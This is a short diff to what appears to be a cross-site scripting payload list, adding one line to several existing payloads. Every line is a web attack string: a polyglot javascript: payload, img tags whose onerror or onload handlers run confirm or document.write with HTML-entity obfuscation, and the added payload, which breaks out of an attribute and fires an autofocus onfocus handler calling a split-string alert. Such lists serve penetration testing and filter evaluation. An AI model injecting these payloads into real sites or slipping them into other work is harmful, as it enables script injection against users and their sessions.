@@ -10,3 +10,4 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/on
 <img src="x" onerror="document.write('<h1>XSS</h1>')">
 <img src=x onload=c&#111;nfirm(1)>
 <img src=x onload=&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)>
+1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
